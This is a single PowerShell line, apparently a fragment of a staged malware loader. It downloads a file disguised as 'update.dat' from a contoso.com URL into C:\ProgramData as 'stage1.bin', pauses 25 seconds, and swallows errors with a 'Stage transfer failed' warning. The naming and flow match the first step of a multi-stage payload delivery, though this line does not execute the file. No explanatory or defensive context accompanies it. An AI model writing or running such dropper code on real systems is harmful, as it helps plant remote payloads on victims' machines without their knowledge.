
try { $Stage2Url = 'https://contoso.com/assets/update.dat'; $WorkingPath = 'C:\ProgramData\stage1.bin'; (New-Object System.Net.WebClient).DownloadFile($Stage2Url, $WorkingPath); Start-Sleep -Seconds 25 } catch { Write-Warning "Stage transfer failed" }
